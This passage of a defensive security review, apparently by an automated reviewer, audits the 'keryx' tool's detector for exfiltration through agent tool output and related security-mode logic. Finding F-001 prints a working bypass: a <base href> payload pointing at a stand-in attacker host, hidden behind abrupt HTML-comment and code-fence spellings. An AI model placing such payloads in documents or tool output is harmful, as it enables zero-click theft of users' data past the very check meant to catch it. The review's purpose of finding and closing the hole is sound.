extraction decision in this file was moved *off* pattern recognition and onto a
real state machine or the platform URL parser, twice, after exactly this failure
mode: `T24 F-004 → T24R#F-002 → T24R2#F-001` for the authority, and T42's
`[^>]*?\bsrc` for the attributes. This is that pattern arriving a third time, on
the one element whose false negative is a whole-document channel. Six payloads
defeat it; four are adjudicated by an independent HTML tokenizer and confirmed
leaking at all four public boundaries with `redaction.state: "none"` (F-001).

The bound T63 relies on does not do the work it is credited with. "Only a span
whose opening AND closing delimiter are both present in this fragment counts as
non-rendered" is a real bound and it does foreclose the obvious abuse (an
unterminated `<!--` cannot blanket-suppress the rest — verified, `c03`/`c04`
still fire). But presence of a matching pair of *this code's* delimiters is not
evidence that a renderer draws a span between them, and every bypass above
supplies such a pair.

***Can it be abused?* Yes — that is precisely the shape the dispatch asked
about.** An attacker writes a construct that looks closed to this code and not
to a renderer. Five bytes, `<!-->`, is enough:
`<!--><base href="https://attacker.invalid/x/">…-->` produces zero findings and
a live document base. Two more spellings do the same (`<!--->`, `--!>`), and a
fourth works through the fence half by quoting a fence marker inside a comment.
Two further shapes work through the markdown model this file's header commits
to (`<!--` and `-->` quoted in code spans or fences — the shape of a page
documenting HTML comments, which is the very false positive the rule was added
to prevent). Note the asymmetry that makes this worse than an ordinary missed
case: T63's own acceptance evidence (`T53-base.ts` `benignFlaggedIds` shrinking
from four ids to two, `T53-corpus.ts` part B losing `codeFenceBaseExample`) is a
measurement of *benign* content only. No probe in the change measured whether a
hostile payload could enter the new spans, and none of the ten matrices re-run
here contains one — which is why every one of them is still green while the
floor is open.

***Is the isolation sufficient?* No.** T63 offers `fencedCodeBlockSpans` as the
half to revisit alone, on the ground that "the HTML-comment half does not depend
on it" and is "unconditionally inert under every renderer model". Measured, the
comment half is where three of the four boundary-confirmed leaks live
(`x01`, `x02`, `x03`), and the fourth (`x07`) is in the fence half. Reverting
either half alone leaves the other half's leaks standing. The isolation is real
as a code boundary and useless as a safety boundary.

**Ruling: revert both halves of `nonRenderedSpans` and the guard at the
`<base>` branch; keep the disclosure work (the comment and `BASE_REMEDIATION`).
T53's standing ruling — "keep the class, keep the empty-allowlist default,
document the blast radius" — was right and should stand; the allowlist remains
the intended remedy for a benign CDN base. If context detection is wanted in a
later round, it needs a real tokenizer and a real CommonMark pass, and its
acceptance evidence must include hostile payloads placed inside every span kind
it recognizes, not only benign ones removed from the finding list.**

I also record, without re-raising, that T63's disposition of T53#F-002,
T53#F-003 and T53#F-004 is correct and complete (Stage 1 row 6), and that
T53#F-004's decision — releasing markup inside a quoted attribute value on the
strength of the reader's parser — is now a recorded decision with its premise
named, which is what T53 asked for. That decision and this one are the same
trade; the difference is that the attribute-value case was measured against 88
tokenizer cases and this one was not measured against any hostile payload at
all.

## Confirmed clean areas

Each was executed, not inspected.

- **Every prior measurement holds.** `T53-extract.ts`: 88 cases, 0 bypasses,
  14 over-approximations with an id set identical to T53's. `T53-resolve.ts`:
  41 destinations × 15 renderer bases = 615 resolutions, 0 bypasses, 0 false
  positives. `T42-exfil-attack.ts`: 42 cases, 0/0. `T24-recheck2-exfil.ts`: 48
  cases, 0/0. `T42-charrefs.ts`: 48 names × 5 shapes = 240 cases, no named or
  numeric spelling bypass, `absentButUrlSyntax: []`. `T24-recheck2-boundary.ts`:
  all 12 canonicalization shapes and all 28 MCP persistence cases keep their
  exact state and reason token. `T42-boundary.ts` ROW 1: the six formerly-leaking
  shapes stay closed and `ctlPublicLink` stays `state=none`. `T52-base.ts`:
  `notNeutralized: []`, `falsePositives: []`. Every one of these was re-run
  again after the mid-review drift with byte-identical output.
- **The corpus sweep still attributes cleanly.** `T53-corpus.ts` part A:
  22,249 files, 0 unreadable, 453 findings; **all 66
  `egress.html-base-href-exfil` findings are in 13 vector-carrying files** —
  the detector's own tests, the T42/T52/T53/T62 probes, T46's surface probe and
  three review/implementation reports. No benign file carries one. The 15
  benign finding-bearing files are gdctx logs of these probes, older worktree
  copies, and `README.md`'s pre-existing badges. Part B: 6 of 30 synthetic
  benign shapes flagged, all by classes that predate the `<base>` class;
  `codeFenceBaseExample` is no longer among them, as T63 recorded.
- **The T39 posture and exit matrices are unmoved.** `T39-posture.ts`: every
  protected verdict byte-identical — non-object and unparseable manifests and
  configs, absent manifest, legitimate empty config, all four recognized modes,
  `C1`'s no-disk-write proof and `D1`'s prototype hygiene. `T39-scan.ts`: the
  four CLI rows unchanged. `T39-exit.ts`: `exitCodeFor`, `reportExitCode`,
  `runExitCode` and `gateExitCode` reproduce cell for cell, with `gateway`'s
  four cells now `1` — the one intended move.
- **`T57-report.ts`'s R2/R3 rows.** All 16 rows reproduce, with exactly one
  cell changed and changed deliberately: `R2d` (a `gateway` workspace with a
  stored `ci` artifact and a `fail` gate) now exits 1 where the probe's
  hard-coded `expected: 0` encodes the pre-T65 belief that `gateway` is
  report-only. That is the earlier reviewer's expectation going stale, not a
  regression; the direction is strict, and the `advisory` inverse control
  (`R2c`) is still 0. The strict/permissive trust boundary is otherwise intact
  in both directions, and `pureFunctionWithArtifactMode` still disagrees with
  `realCliExit` on the rows that prove the fold does not take its strictness
  from the artifact.
- **`T57-mode.ts`'s 36 payloads.** Unchanged: 29 unrecognized shapes give
  `mode:"enforced"`, `configUnreadable:true`, `guardAllowed:false`, CLI exit 1,
  `credentialLetThrough:false`; the permissive default survives for an absent
  key, absent file and `{}`; `{"mode":null}` still blocks; `__proto__` decoys
  are still the absent case; `leaky:false` on all 36; `Object.prototype` clean.
- **Leak safety on every repaired path.** No fixture root, planted key, `JSON`,
  `ENOENT`, `SyntaxError` or `Unexpected` in any result of the health matrix
  (16 shapes × 4 readers), the flow matrix (18 rows), the mode matrix or the
  state matrix. The new `CONFIG_UNREADABLE_REASON` is a fixed string with no
  interpolation. The one path that does interpolate is F-005, and it is
  pre-existing.
- **Constant reasons.** `"security posture unavailable: check could not
  complete"`, ``"no report; run `keryx health run` first"``, `"health gate could
  not be evaluated; treated as failed, not skipped"` and
  `"CONFIG: health configuration is unreadable; gate forced to strictest
  thresholds"` are each the single string on their path.
- **Committed suites.** `bun src/cli.ts ctx run -- bun test
  src/security/detect/exfil.test.ts src/security/guard.test.ts
  src/security/security.test.ts src/health/service-gate-exit.test.ts
  src/health/config.test.ts src/health/gate.test.ts
  src/commands/security-gate-exit.test.ts
  src/commands/security.check-input.test.ts src/flow/service.test.ts` →
  **196 pass / 0 fail / 1375 expect()**, 9 files. The four exfil-focused suites
  re-run after the drift: **96 pass / 0 fail / 850 expect()**.
  `bun run typecheck` exit 0.
- **T57 F-004 is unchanged and still out of scope.** `T39-exit.ts` F2 still
  shows a hand-built `securityGate` returning `"skipped"` completing the flow.
  `securityFlowGate` cannot produce it; recorded so the next round does not
  rediscover it.

### Two evidence traps, and how each was avoided

The dispatch named both and both were live in this review.

1. **A probe that calls a pure function cannot observe a fix made at its call
   site.** Row 1 is measured through the production `healthGate` wiring and the
   captured `tracker.comment(...)` argument, not a stubbed dep and not
   `result.gates`. Row 2 is measured at `analyze()`, never at
   `evaluateSelfProtection`. Row 3 is measured at `securityCommand(...)`,
   `guardOutput` and `securityFlowGate`, never at `exitCodeFor`/`reportExitCode`
   alone. Row 5's verdict is taken from `createCodeHealthService().run(...)` as
   well as from `computeGate`. **F-001 is measured at four public boundaries,
   not at `detectExfil`** — which matters, because `detectExfil` is a pure
   function and a boundary that happened to re-mask would have made the finding
   wrong.
2. **A regression whose fixtures differ in an irrelevant way passes regardless
   of the code.** T60 disclosed catching exactly this in its own first draft
   (a per-status title that made two records differ trivially). My row-1
   comparison uses a single fixed title and slug for both runs and both roots
   start empty, so the only difference between the two stored records is the
   health status; and the pass row is pinned to the exact pre-fix constant
   `"all gates passed"` rather than to "not equal to the warn row".

## Evidence

Raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`.
Probes were executed **directly** rather than through `bun src/cli.ts ctx run`,
because gdctx compaction drops the per-case rows that are the evidence itself.
I observed that concretely in this session and record it rather than inheriting
the claim: `bun src/cli.ts ctx rg -n
"healthWarnNote|healthGateOutcome|buildIssueComment|all gates passed|gateLine"
src/flow/service.ts` reported `Matches: 18` and displayed **4** of them, and
the `gateway` sweep over `src`/`docs` truncated a 21-hit list to a handful. In
every such case I read the full raw log the tool writes. Tests, typecheck and
diffs were routed through `ctx run` / `ctx diff`.

| # | What ran | Raw log | SHA-256 |
|---|---|---|---|
| 1 | `T62-flow.ts` (row 1, real health service + captured published comment) | `T62-flow.log` | `244c9508c37c00c5aeb7f7570d8d5bdde50274d99752d337c0b776b6e253d878` |
| 2 | `T62-state.ts` (row 2, `analyze()` + `state.json` + `incidents.jsonl`) | `T62-state.log` | `d573be65110b7f2af9ab6256b006a9c2f3d45909ccc167d4d42f52e06325bce4` |
| 3 | `T62-mode.ts` (row 3, 4 modes × 4 command surfaces + 2 seams + 12 rank pairs) | `T62-mode.log` | `81c0e7046acc951880a9f0f5be3362b7f02e95f9bc22771caf3f960c28191ca8` |
| 4 | `T62-health.ts` (rows 4 and 5, 16 shapes × 4 readers, 9 configs, real `run()`) | `T62-health.log` | `ee63c9298bc92e1b6b632d324a5d7ab18e8c7b5c0a301b823272f2281ee9792a` |
| 5 | `T62-exfil.ts` (row 6 judgement call, 13 cases, lol-html oracle) | `T62-exfil.log` | `aced49a50b17d7b225b61567d98cf811f8a34789bd042c800599e2095fdbed2a` |
| 6 | `T62-boundary.ts` (F-001 at four real public boundaries) | `T62-boundary.log` | `2f98d4b84b11f671e490464e5ccf08c7dfd515914a2deb9e2aa0b114655dcf32` |
| 7 | `T62-exfil.ts` / `T62-boundary.ts` re-run **after** the drift | `T62-exfil-postdrift.log`, `T62-boundary-postdrift.log` | identical to rows 5 and 6 — that identity is the drift evidence |
| 8 | `T57-flow.ts` re-run | `T62-rerun-T57-flow.log` | `36fe5914c4edac0c195dd29be2566fc860eeadace83ffea178ebce774f59c7a9` |
| 9 | `T57-state.ts` re-run | `T62-rerun-T57-state.log` | `4955a65fe2e93ff93227c9df4076c90eb4c282b3594e1f79e70ef51300af67e5` |
| 10 | `T57-health.ts` re-run | `T62-rerun-T57-health.log` | `5da9002800ec303c9a975c3cce036a083645f3a593115db50a814622f443a666` |
| 11 | `T57-mode.ts` re-run | `T62-rerun-T57-mode.log` | `7d0fc690611edeca3cdc2660aaa7b52a7da332c4bb8c16854e0dd9df116486c2` |
| 12 | `T57-report.ts` re-run | `T62-rerun-T57-report.log` | `9a819ff746f4874200659823e2c6199cc5a5164c4989f2c156278a9665966f78` |
| 13 | `T65-verify-gateway.ts` re-run | `T62-rerun-T65-verify-gateway.log` | `7df23d37f75412772dd54ffd683e93292d25fdb790887390747d26dcf1622b8e` |
| 14 | `T53-extract.ts` re-run (88 cases) | `T62-rerun-T53-extract.log` / `T62-postdrift-T53-extract.log` | `ad20286ba1aab3f8e810d3c84f6a8610ba96e6362e810b5caf476f50b80834ad` (both) |
| 15 | `T53-resolve.ts` re-run (615 resolutions) | `T62-rerun-T53-resolve.log` / `…postdrift…` | `0603791031f8f078bf7481c787fc828859306e62f95cc2109bf253c8b53cb2e4` (both) |
| 16 | `T53-base.ts` re-run (23 cases) | `T62-rerun-T53-base.log` / `…postdrift…` | `19fd6efa2d6a33d6c23338ec37ce106c3756b191b01b916a6ddf845580934c7f` (both) |
| 17 | `T53-boundary.ts` re-run (26 shapes × 4 boundaries) | `T62-rerun-T53-boundary.log` / `…postdrift…` | `398012ceb8654c55f51235fd5548e0576c3369c7cf8159c251ccb2ff69b3768d` (both) |
| 18 | `T53-corpus.ts` re-run (22,249 files + 30 benign shapes) | `T62-rerun-T53-corpus.log` | `fc123b86ba8ab79b96e9454d9758778492b622780b6a3e803372b56d7dc38254` |
| 19 | `T52-base.ts` re-run (14 cases) | `T62-rerun-T52-base.log` / `…postdrift…` | `a04404db8a1571b102dc21ae85517b3345eb94496553c0fb8bded5811010dff2` (both) |
| 20 | `T42-exfil-attack.ts` re-run (42 cases) | `T62-rerun-T42-exfil-attack.log` / `…postdrift…` | `0646c50821177132e3e84528af5557b609f244fc13f109224de1496f879222ba` (both) |
| 21 | `T42-charrefs.ts` re-run (240 cases) | `T62-rerun-T42-charrefs.log` / `…postdrift…` | `698d88993076fd92aad9b4a4e1f8235a0eac2b7490baa0d34d8d1c65cac1b452` (both) |
| 22 | `T42-boundary.ts` re-run | `T62-rerun-T42-boundary.log` / `…postdrift…` | `7030455d39a56b12e98c75b8a74c699a3d488dbf9d04b4ac060bfe9151f957c8` (both) |
| 23 | `T24-recheck2-exfil.ts` re-run (48 cases) | `T62-rerun-T24-recheck2-exfil.log` | `3a1631cbdc23f8eaf3fd1f3aa92f4b1fdccac09fd531550c7551ce0cae67e9ce` (post-drift `ff7763c8…`; differs only in the output filename its last line prints — matrix identical row by row) |
| 24 | `T24-recheck2-boundary.ts` re-run (12 + 28 cases) | `T62-rerun-T24-recheck2-boundary.log` | `bfc4baa7157c3ad34eff26c5c7fbf7c93fcad6fc2aa0308e7d8465c7683e115e` |
| 25 | `T39-posture.ts` re-run | `T62-rerun-T39-posture.log` | `3d69814d44952dae23b6459a79a0cb115b583fa1a1c6f2bf5fcd1b296a11d2c1` |
| 26 | `T39-exit.ts` re-run | `T62-rerun-T39-exit.log` | `b7c8f470cb0e82bbc3a7e11e022ddfa1044f65f7879f1f2ce4635583315d8f97` |
| 27 | `T39-scan.ts` re-run | `T62-rerun-T39-scan.log` | `d94dd7f558a304170190d4159d1bf18d1fc223974711d9a3cfca463fbfb99594` |
| 28 | Focused suites (9 files, 196 pass / 0 fail) | `2026-09-06T17-26-24-441Z_run.log` | (gdctx-recorded) |
| 29 | Exfil-focused suites after the drift (4 files, 96 pass / 0 fail) | `2026-09-06T17-28-49-887Z_run.log` | (gdctx-recorded) |
| 30 | `bun run typecheck` | `2026-09-06T17-26-38-600Z_run.log` | (gdctx-recorded) |
| 31 | File hashes, start / end | `T62-hashes-start.txt` / `T62-hashes-end.txt` | `95ce99f8…d00877` / `2b92b625…3194ec` |
| 32 | Class enumeration for F-001 (pre- and post-drift) | `2026-09-06T17-11-01-582Z_rg.log`, `2026-09-06T17-27-43-994Z_rg.log` | (gdctx-recorded) |
| 33 | `gateway` enumeration across `src` (row 3) | `2026-09-06T17-09-14-745Z_rg.log` | (gdctx-recorded) |
| 34 | Prose mode enumerations (F-004) | `2026-09-06T17-17-18-491Z_rg.log`, `2026-09-06T17-09-44-374Z_rg.log` | (gdctx-recorded) |
| 35 | `readLatest` caller enumeration (row 4) | `2026-09-06T17-10-06-148Z_rg.log`, `2026-09-06T17-19-34-554Z_rg.log` | (gdctx-recorded) |
| 36 | Health source error enumeration (F-005) | `2026-09-06T17-22-00-830Z_rg.log` | (gdctx-recorded) |

Probe JSON outputs from the re-run T53/T42/T52 matrices live under the session
scratchpad, because the dispatch permits writing only `T62-review.md`,
`T62-result.json` and `T62-*.ts` under the artifacts directory. Every probe is
deterministic and re-runnable from the committed `.ts` files.

## Routing audit

`graph_used: no (not-relevant — the dispatch pinned the exact file set, the
exact symbols and the exact prior findings; the only enumeration questions were
text-shape ones, which `ctx rg` answers directly, and the graph's own manifest
warns it answers from the last `keryx gdgraph build` rather than the working
tree, which is uncommitted here and was edited by a concurrent worker during
this review). wiki_used: no (not-relevant — the normative sources are
`docs/requirements/keryx-agent-first-core/policies.md`, the frozen
`acceptance-criteria.md`, the two review SKILL.md files and the canonical
severity rubric they defer to, all read directly). ctx_used: yes — every
project-code and documentation search through `bun src/cli.ts ctx rg`, every
test and typecheck through `bun src/cli.ts ctx run`, the two diffs through
`bun src/cli.ts ctx diff`, all raw logs cited above by path. The eleven probes
(six mine, and the sixteen earlier ones re-run) were executed directly rather
than through `ctx run`, for the reason given and demonstrated at the head of
the Evidence section. raw_rg_used: no — no bare `rg`/`grep`/`cat`/`find`/`sed`
was run over project code or docs. Every project-code excerpt was read with the
`Read` tool at bounded offsets, every gdctx raw log with a bounded `bun -e`
reader, and `shasum`/`git rev-parse`/`ls` are not content searches.`

```json keryx:findings
[
  {
    "id": "F-001",
    "global_id": "T62#F-001",
    "reviewer": "review-security-code+review-logic (T62)",
    "severity": "blocker",
    "file": "src/security/detect/exfil.ts",
    "line": 729,
    "symbol": "nonRenderedSpans",
    "problem": "T63's new rule suppresses an egress.html-base-href-exfil finding when the <base> tag falls inside a span this code judges CLOSED, as an HTML comment (/<!--[\\s\\S]*?-->/) or a CommonMark fenced code block (a left-to-right pairing of fence-marker lines). Both approximations are wrong in the direction that suppresses. (1) HTML_COMMENT_SPAN recognizes only `-->`; the HTML tokenizer also closes a comment at `<!-->` and `<!--->` (abrupt-closing-of-empty-comment) and at `--!>` (comment-end-bang), each of which ends the comment BEFORE the attacker's <base> while the regex swallows it. (2) fencedCodeBlockSpans pairs fence lines with no awareness of any other block context, and nonRenderedSpans computes fence spans and comment spans independently of each other, so a fence marker quoted inside a comment (or comment delimiters quoted inside a fence or a code span) opens a span the renderer does not have. The stated bound - only a span with BOTH delimiters present counts - forecloses the unterminated-delimiter abuse but is not the property that makes suppression safe: a matching pair of THIS code's delimiters is not evidence that a renderer draws a span between them, and every bypass supplies such a pair.",
    "impact": "AC5 (AFC-15) and the phase's own 'no new bypass' criterion fail: the zero-click <base href> exfiltration channel that took five rounds to close is reopened for five bytes. `<!--><base href=\"https://attacker.invalid/x/\">...-->` produces ZERO findings and leaves the attacker's document base in the released text, re-pointing every relative URL in the document so that each relative image fires a zero-click GET carrying the surrounding path. It is a complete release, not a partial one: at dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput all four report redaction.state \"none\" with an empty reasons array, so the caller is not even told anything was considered. Blast radius is whole-document, per T53#F-001.",
    "suggested_fix": "Revert both halves of nonRenderedSpans and the guard at the <base> branch; keep T63's disclosure work (the asymmetry comment and BASE_REMEDIATION), which is correct and is what T53#F-001 actually asked for. Reverting only fencedCodeBlockSpans - the isolation T63 offered - is NOT sufficient: it removes x07 but leaves x01/x02/x03, three of the four boundary-confirmed leaks, in the HTML-comment half. Reverting only the comment half leaves x07. If context detection is wanted later it needs a real HTML tokenizer and a real CommonMark pass (the discipline readStartTag already applies to attributes), must fail toward flagging on every ambiguity rather than only on an unterminated delimiter, and its acceptance evidence must include hostile payloads placed inside every span kind it recognizes - T63's evidence measured only benign content being removed from the finding list.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-boundary.ts, raw .metaproject/data/gdctx/raw/T62-boundary.log (sha256 2f98d4b84b11f671e490464e5ccf08c7dfd515914a2deb9e2aa0b114655dcf32), advisory redaction OFF: {\"label\":\"SUMMARY\",\"hostileLeakingAtAnyBoundary\":4,\"ids\":[\"abruptEmptyComment\",\"abruptDashComment\",\"commentEndBang\",\"fencePairSwallowsLiveBase\"]}, each with mcpState \"none\", mcpReasons [], persistState \"none\", transportState \"none\", leaksHost {mcp:true,persist:true,transport:true,seam:true}. Controls in the same run: plainHostileBase and unterminatedComment both redacted with [\"egress.html-base-href-exfil\"] and leaking nothing; T63's two benign suppression targets byte-identical. bun .../T62-exfil.ts, raw T62-exfil.log (sha256 aced49a50b17d7b225b61567d98cf811f8a34789bd042c800599e2095fdbed2a) adjudicates the renderer question with Bun's HTMLRewriter (lol-html), an independent spec-derived tokenizer: rows x01, x02, x03 and x07 all report lolHtmlLiveBaseHref \"https://attacker.invalid/x/\" with baseFindings 0; two further shapes (x05, x06) bypass under the markdown-with-passthrough model this file's header commits to. Summary {\"cases\":13,\"bypasses\":6}. Both logs byte-identical before and after the concurrent worker's mid-review edit to exfil.ts.",
    "confidence": "high",
    "dedupe_key": "afc15:exfil:base-inert-span-suppression-bypass",
    "blocking_merge": true,
    "related_skill": "review-security-code",
    "learning_candidate": true,
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:729",
        "src/security/detect/exfil.ts:730",
        "src/security/detect/exfil.ts:736",
        "src/security/detect/exfil.ts:763",
        "src/security/detect/exfil.ts:773",
        "src/security/detect/exfil.ts:942"
      ],
      "enumeration_method": "bun src/cli.ts ctx rg -n \"fencedCodeBlockSpans|nonRenderedSpans|isInNonRenderedSpan|getNonRenderedBaseSpans|HTML_COMMENT_SPAN|FENCE_LINE\" src/security/detect/exfil.ts (raw 2026-09-06T17-11-01-582Z_rg.log pre-drift, 2026-09-06T17-27-43-994Z_rg.log post-drift) enumerated every site of the new mechanism - six definitions and one consumer, the tag===\"base\" branch - each read in full. Line numbers are post-drift; pre-drift equivalents are :568, :569, :575, :602, :612, :745. The bypass set was derived from the HTML Standard's comment states (comment-start, comment-start-dash, comment-end-bang, comment-end) and CommonMark's fenced-code and HTML-block rules, one payload per state, each adjudicated by lol-html where the pure-HTML tokenizer decides and by the named CommonMark rule where markdown decides, then driven through all four real public boundaries rather than through detectExfil alone."
    }
  },
  {
    "id": "F-002",
    "global_id": "T62#F-002",
    "reviewer": "review-security-code+review-logic (T62)",
    "severity": "minor",
    "file": "src/security/self-protect.ts",
    "line": 39,
    "symbol": "MODE_RANK / evaluateSelfProtection",
    "problem": "T61 resolved the gateway disagreement in the BLOCKING direction but not in the ORDERING direction. After T61 and T65, gateway is behaviourally identical to enforced and ci at every site that branches on the mode (isBlockingMode guard.ts:237, reportExitCode commands/security.ts:683, exitCodeFor :972) - measured cell for cell at four command surfaces and both module seams. MODE_RANK nevertheless gives gateway 3 and enforced/ci 2, so reconfiguring gateway -> enforced (or -> ci) appends a durable mode-downgrade entry to the append-only incidents.jsonl with the message 'Mode changed from gateway to enforced' and the warning '(enforcement weakened)'. Nothing was weakened. This is T57#F-002's shape - a durable record asserting something that did not happen - on the readable-config path, which T61's !config.configUnreadable guard by construction does not cover. T61's cited reason for holding the table fixed is partly circular: the regressions it defers to (T58 D2, and T61 D1 which T61 wrote itself) were authored under the ranking they are cited to justify, and T61 corrected exactly such a committed expectation on the other axis (guard.test.ts's {mode:\"gateway\", blocks:false} row).",
    "impact": "Fail-loud noise in the audit trail, not a bypass: no check is relabeled and nothing is let through. A false entry in the append-only trail erodes the signal a real mode-downgrade carries. Reachability is low - gateway is still documented as unimplemented (T62#F-004) and is unlikely to be set today.",
    "suggested_fix": "Rank gateway at 2 alongside enforced and ci for as long as it has no behaviour of its own; gateway -> advisory stays a downgrade (the only one true today) and advisory -> gateway stays silent. T58 D2's gateway -> ci pin then encodes a claim the code no longer makes and should be corrected in writing, the way T61 corrected guard.test.ts's row. If the ranking is deliberately forward-looking for Phase 4, keep it and change the wording instead: an incident and a warning asserting 'enforcement weakened' must not fire for a transition that weakens nothing.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-mode.ts, raw .metaproject/data/gdctx/raw/T62-mode.log (sha256 81c0e7046acc951880a9f0f5be3362b7f02e95f9bc22771caf3f960c28191ca8). M3 drives all 12 ordered pairs of recognized modes through the real analyze() and reads incidents.jsonl back: {\"from\":\"gateway\",\"to\":\"enforced\",\"downgradeDetected\":true} and {\"from\":\"gateway\",\"to\":\"ci\",\"downgradeDetected\":true}. M2 in the same run: gateway, ci and enforced all give guardAllowed:false and flowGateStatus \"fail\" with no 'informational' shortcut. M1: identical exit codes for gateway/ci/enforced across 11 gate x surface cells at scan, report, check-input and check-output, with advisory 0 everywhere.",
    "confidence": "high",
    "dedupe_key": "security-mode-rank-vs-behaviour-false-downgrade-incident",
    "blocking_merge": false,
    "related_skill": "gdskills/orchestration/task-implementer",
    "learning_candidate": true
  },
  {
    "id": "F-003",
    "global_id": "T62#F-003",
    "reviewer": "review-security-code+review-logic (T62)",
    "severity": "minor",
    "file": "src/security/self-protect.ts",
    "line": 123,
    "symbol": "evaluateSelfProtection (disabled-policy arm)",
    "problem": "T61 extended T58's !config.configUnreadable guard from the mode arm to the disabled-policy arm, on the stated ground that 'a forced/derived config's policies (defaults, for a fully-unusable payload) are not an operator's choice either'. That is true for one broken shape and false for the other. For an unusable payload the policies ARE the defaults (all enabled), so no policy-disabled comparison could fire anyway and the guard is a no-op. For an UNRECOGNIZED MODE, loadSecurityConfig returns {...merged, mode:'enforced', configUnreadable:true} and merged carries the operator's real parsed policies - config.ts:228-233 says so explicitly. So a policy the operator genuinely disabled in that same file produces no warning and no incident, although the statement would have been true of their own bytes. Section 14's stated invariant, 'a mode downgrade or a disabled policy is always surfaced (warn + incident)' (self-protect.ts:14-18), is silent for the window and silent forever if the mode typo is never repaired.",
    "impact": "Not a bypass and not a false record - an omission, not an assertion, so AC8 is not violated. Enforcement during the window is maximally strict (guardOutput and securityFlowGate refuse everything through their posture-unavailable branches), so the disabled policy buys nothing while it lasts, and detection resumes on the next readable run. The cost is that a self-protection control which promises to always surface an operator's change can be silenced by a four-byte edit to a neighbouring field, and that the reason recorded beside the guard is not the reason it is safe.",
    "suggested_fix": "Narrow the guard to the shape it was argued for. The loader already distinguishes the two cases (mergeSecurityConfig({}) for an unusable payload vs {...merged, ...} for an unrecognized mode); carrying that distinction - a second flag, or comparing config.policies against the defaults - lets the policy arm keep running for the unrecognized-mode shape while staying silent for the derived one. At minimum correct the comment: for the unrecognized-mode shape the policies are the operator's choice, and the arm is guarded for convenience, not because the statement would be untrue.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-state.ts, raw .metaproject/data/gdctx/raw/T62-state.log (sha256 d573be65110b7f2af9ab6256b006a9c2f3d45909ccc167d4d42f52e06325bce4), measured at analyze(): B0 control (readable config, promptInjection disabled) -> incidents [\"policy-disabled\"], warnings [\"security policy \\\"promptInjection\\\" was disabled.\"]. B1 (unrecognized mode + the same real disable in one file) -> incidentsDuringWindow [], warningsDuringWindow [], trueDisableSuppressedDuringWindow true, detectedOnceRepaired true. B2 (never repaired, 3 runs) -> incidents [], realDisableEverRecorded false. B3 (unusable payload) -> incidentsDuringWindow [], confirming the guard is a no-op for that shape.",
    "confidence": "high",
    "dedupe_key": "self-protect-policy-arm-guard-suppresses-true-signal",
    "blocking_merge": false,
    "related_skill": "gdskills/orchestration/task-implementer",
    "learning_candidate": false
  },
  {
    "id": "F-004",
    "global_id": "T62#F-004",
    "reviewer": "review-security-code+review-logic (T62)",
    "severity": "minor",
    "file": "docs/docs/cli-reference.md",
    "line": 2096,
    "symbol": "security module documentation",
    "problem": "docs/docs/cli-reference.md:2096 states 'Model/API backends and gateway mode (Phase 4) are not implemented.' After T61 and T65, gateway is a fully enforcing posture: it blocks the write seam, fails flow completion, and exits non-zero at security scan, report, check-input and check-output. Every surrounding prose enumeration of which modes block still reads 'advisory ... enforced/ci block' and omits gateway - src/security/templates.ts:62-64 and :124 (written into the operator's own project by keryx init/update as agent-facing rules), .metaproject/modules/security.md:48, docs/docs/architecture.md:547,563, docs/docs/modules.md:865,874,881, docs/docs/workspace-and-lifecycle.md:339,350 and docs/docs/cli-reference.md:330,754,912,993,1058. T65's enumeration covered src/commands/security.ts exhaustively and correctly but did not look outside that file; the residual is disclosed in neither T61 nor T65.",
    "impact": "An operator reading the reference would believe setting mode: gateway is inert and instead get the strictest posture the tool has - blocked writes, a failing flow gate and non-zero exits at four commands. The reverse mistake is worse: templates.ts's text is the guidance an agent reads inside the target project, and it tells that agent gateway is not one of the modes that refuse.",
    "suggested_fix": "Correct cli-reference.md:2096 (gateway's blocking behaviour is implemented; only its Phase-4 proxy behaviour is not) and add gateway to the 'enforced/ci block' enumerations, src/security/templates.ts first because it ships into user projects.",
    "evidence": "bun src/cli.ts ctx rg -n '\"gateway\"' src (raw .metaproject/data/gdctx/raw/2026-09-06T17-09-14-745Z_rg.log): six production sites, all now blocking. bun src/cli.ts ctx rg -n 'enforced.*ci|advisory.*enforced' docs .metaproject/modules src/security/templates.ts (raw 2026-09-06T17-17-18-491Z_rg.log): the prose enumeration above. Behaviour measured in .metaproject/data/gdctx/raw/T62-mode.log rows M1 and M2.",
    "confidence": "high",
    "dedupe_key": "security-gateway-prose-classification-stale",
    "blocking_merge": false,
    "related_skill": "gdskills/orchestration/task-implementer",
    "learning_candidate": false
  },
  {
    "id": "F-005",
    "global_id": "T62#F-005",
    "reviewer": "review-security-code (T62)",
    "severity": "info",
    "file": "src/health/run.ts",
    "line": 240,
    "symbol": "SourceRunInfo.error -> computeGate -> HealthReport.gate.reasons",
    "problem": "Three sites in src/health/run.ts (:240, :275, :297) build a source's `error` by interpolating a caught error.message. computeGate (gate.ts:78-79) interpolates that into `INCOMPLETE: required source unavailable: ${source.source}${detail}`, which is persisted into .metaproject/data/health/artifacts/latest.json (a committable artifact) and, through healthGateOutcome's incomplete/fail arms, into flow.json's completion-failed history entry. A caught error.message from a spawned tool or a file read routinely carries an absolute path. This sits directly beside the constant, non-interpolated CONFIG_UNREADABLE_REASON T64 added, which is exactly right; its neighbours in the same array are not held to the same bar.",
    "impact": "None demonstrated: the two error strings I could reach in a synthetic fixture are fixed phrases ('dependency audit JSON parse failed', and the absent-source case with no detail), so no payload carrying a filesystem path was constructed. Recorded because the whole phase turns on durable records carrying only constant, leak-safe reasons, and this is the one path into those records that is not constant. Pre-existing; introduced by none of the five repairs under review.",
    "suggested_fix": "Give the three run.ts sites a constant category the way dependency-audit.ts and eslint.ts already do, or keep source.error out of the string computeGate serialises into reasons. Track separately - it is outside every row of this dispatch.",
    "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-health.ts row G32 (raw .metaproject/data/gdctx/raw/T62-health.log) shows a source error reaching a gate reason at the real entry point createCodeHealthService().run(). bun .../T62-flow.ts rows S03/S04 (raw T62-flow.log) show the health module's reasons reaching flow.json history verbatim (leakedSecret true for a string planted in reasons). bun src/cli.ts ctx rg -n 'error: ' src/health/sources src/health/run.ts src/health/service.ts (raw 2026-09-06T17-22-00-830Z_rg.log) enumerates three interpolating sites against nine constant ones.",
